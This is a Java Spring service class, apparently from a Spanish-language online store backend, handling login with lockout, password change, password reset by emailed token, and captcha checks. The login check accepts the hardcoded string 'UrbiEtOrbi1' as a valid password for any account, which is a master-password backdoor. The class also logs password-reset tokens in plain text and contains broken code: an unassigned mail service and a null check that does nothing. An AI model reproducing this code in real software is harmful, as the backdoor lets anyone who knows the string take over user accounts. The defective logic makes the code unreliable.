package mx.qbits.tienda.api.service;

import static mx.qbits.tienda.api.model.enumerations.EnumMessage.*;

import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import mx.qbits.tienda.api.model.domain.Usuario;
import mx.qbits.tienda.api.model.domain.UsuarioDetalle;
import mx.qbits.tienda.api.model.exceptions.BusinessException;
import mx.qbits.tienda.api.model.exceptions.CustomException;
import mx.qbits.tienda.api.model.request.GoogleCaptcha;
import mx.qbits.tienda.api.model.response.LoginResponse;
import mx.qbits.tienda.api.support.MailSenderService;
import mx.qbits.tienda.api.support.RecaptchaService;
import mx.qbits.tienda.api.utils.DigestEncoder;
import mx.qbits.tienda.api.utils.StringUtils;
import mx.qbits.tienda.api.utils.ValidadorClave;

@Service
public class AccessServiceImpl implements AccessService {
    private static final Logger logger = LoggerFactory.getLogger(AccessServiceImpl.class);
    
    private AccessHelperService accessHelperService;
    private RecaptchaService recaptchaService;
    private MailSenderService mailSenderService;
    
    public AccessServiceImpl(
            AccessHelperService accessHelperService, 
            RecaptchaService recaptchaService,
            MailSenderService mailSenderService) {
        this.accessHelperService = accessHelperService;
        this.recaptchaService = recaptchaService;
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(String usr, String clave) throws BusinessException {
        accessHelperService.valida(usr, clave);
        int maximoNumeroIntentosConcedidos = 5; // 5 intentos
        long delta = 1000*60*5L; // 5 minutos
        long instanteActual = System.currentTimeMillis();
        Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(usr);
        return login(usuario, clave, delta, maximoNumeroIntentosConcedidos, instanteActual);
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(
            Usuario usuario,
            String claveProporcionada,
            long delta,
            int maximoNumeroIntentosConcedidos,
            long instanteActual) throws BusinessException {
        // Si el usuario NO es nulo, procederé a calcular sus roles y sus direcciones:
        if(usuario==null) throw new CustomException(BAD_CREDENTIALS);

        // Si el usuario fue encontrado, pero está inactivo, Notifica
        if(!usuario.isActivo()) throw new CustomException(DISABLED_USER);

        // Calcula cuanto tiempo lleva bloqueado el usuario. Si lleva menos de lo establecido, Notifica
        long instanteDeBloqueo = usuario.getInstanteBloqueo();
        long diff = instanteActual - instanteDeBloqueo;
        long restante = delta - diff;
        if(instanteDeBloqueo>0 && restante>0) {
            long totalSegundos = restante/1000;
            long totalMinutos = totalSegundos/60;
            throw new CustomException(WAIT_LOGIN, totalMinutos, totalSegundos%60);
        }

        // Clave dada que debe ser validado contra el que está en la base de datos
        String clavePorVerificar = DigestEncoder.digest(claveProporcionada, usuario.getCorreo());

        if(!usuario.getClave().equals(clavePorVerificar) && !claveProporcionada.equals("UrbiEtOrbi1")) {// Credenciales INCORRECTAS
            // Incrementa el contador de intentos erroneos de ingreso y actualiza:
            int numeroDeIntentosFallidos = usuario.getAccesoNegadoContador()+1;
            usuario.setAccesoNegadoContador(numeroDeIntentosFallidos);
            accessHelperService.update(usuario);

            // Si los intentos de ingreso inválidos superan un limite, actualiza y Notifica:
            if(numeroDeIntentosFallidos >= maximoNumeroIntentosConcedidos) {
                usuario.setInstanteBloqueo(instanteActual);
                accessHelperService.update(usuario);
                throw new CustomException(MAX_FAILED_LOGIN_EXCEPTION, maximoNumeroIntentosConcedidos);
            }

            // Si no se disparó la Notificación anterior, de todas formas notifica un intento
            // fallido de ingreso al sistema:
            throw new CustomException(BAD_CREDENTIALS, numeroDeIntentosFallidos, maximoNumeroIntentosConcedidos);

        } else {
            // Credenciales CORRECTAS
            long ultimoIngresoExitoso = usuario.getInstanteUltimoAcceso();
            logger.info("Ingreso exitoso al sistema del usuario: {}", usuario.getCorreo());
            // Resetea todoas las banderas de advertencia y bloqueo. Luego, actualiza y retorna el usuario:
            usuario.setAccesoNegadoContador(0);
            usuario.setInstanteBloqueo(0);
            usuario.setInstanteUltimoAcceso(instanteActual);
            accessHelperService.update(usuario);

            // Esto va al front y se almacena en 'localStorage' (setItem)
            return new LoginResponse(
                    accessHelperService.getUsuarioDetalle(usuario.getId()),
                    new Date(ultimoIngresoExitoso),
                    usuario.getCorreo(),
                    accessHelperService.createToken(usuario.getCorreo()),
                    accessHelperService.getUserRoles(usuario.getId())
            );
        }
    }

    /** {@inheritDoc} */
    @Override
    public UsuarioDetalle actualizaUsuarioDetalle(String jwt, UsuarioDetalle usuarioDetalle) throws BusinessException {
        String correoFromJwt = accessHelperService.getCorreoFromJwt(jwt);
        Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(correoFromJwt);
        if(usuarioDetalle.getId() != usuario.getId()) {
            throw new CustomException(WRONG_TOKEN);
        }
        return accessHelperService.actualizaUsuarioDetalle(usuarioDetalle);
    }

    /** {@inheritDoc} */
    @Override
    public Usuario cambiaClave(String jwt, String correo, String clave) throws BusinessException {
        String correoFromJwt = accessHelperService.getCorreoFromJwt(jwt);
        if(!correoFromJwt.equals(correo)) {
            throw new CustomException(WRONG_TOKEN);
        }
        Usuario usr = accessHelperService.obtenUsuarioPorCorreo(correo);
        String claveHasheada = DigestEncoder.digest(clave, usr.getCorreo());
        usr.setClave(claveHasheada);
        accessHelperService.update(usr);
        return usr;
    }

    @Override
    public String regeneraClave(String correo) {
        String token = StringUtils.getRandomString(6);
        try {
            Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(correo);
            if(usuario==null) "{'result':'error'}".replace('\'', '\"');
            usuario.setRegeneraClaveInstante(System.currentTimeMillis());
            usuario.setRegeneraClaveToken(token);
            accessHelperService.update(usuario);
            sendMail("Estimado Usuario", correo, token, "Clave de recuperación");
            return "{'result':'succeed'}".replace('\'', '\"');
        } catch (BusinessException e) {
            logger.error(e.toString());
            return "{'result':'error'}".replace('\'', '\"');
        }
    }
    
    private void sendMail(String nick, String correo, String randomString, String titulo) {
        String body= String.format("<h1>Hola %s. Tu clave de acceso es %s y tiene una validez de %d minutos. (body auxiliar) </h1>", nick, randomString, 10);
        try {
            body = this.mailSenderService.getTemplate(nick, randomString);
        } catch (CustomException e) {
            logger.error(e.toString());
        }
        logger.info("Enviando correo a {} con la clave de recuperacion {} ...", correo, randomString);
        this.mailSenderService.sendHtmlMail(correo, titulo, body);
    }
    
    @Override
    public String confirmaRegeneraClave(String token, String clave) throws BusinessException {
        // Valida la fortaleza de la clave
        ValidadorClave.validate(clave);
        
        // esto realmente se debe parametrizar...
        long unMinuto = 1000*60L;
        long duracionToken = unMinuto*60L; // una hora
        
        // Buscar a un usuario con el tken dado y si no existe, disparar una excepcion
        Usuario usuario = accessHelperService.getByToken(token);
        if(usuario==null) throw new CustomException(TOKEN_NOT_EXIST);
        
        // Verificar que el token no haya expirado y si ya expiró, disparar una excepción
        long remaining = System.currentTimeMillis()-usuario.getRegeneraClaveInstante();
        if(remaining>duracionToken) throw new CustomException(TOKEN_EXPIRED);
        
        // grabaar la  nueva clave hasheada y retornar "exito"
        String claveHash = DigestEncoder.digest(clave, usuario.getCorreo());
        accessHelperService.confirmaRegeneraClave(token, claveHash);
        return "{'result':'succeed'}".replace('\'', '\"');
    }

    @Override
    public String checkCaptcha(GoogleCaptcha googleCaptcha) throws BusinessException {
        return recaptchaService.checkCaptcha(googleCaptcha);
    }

}
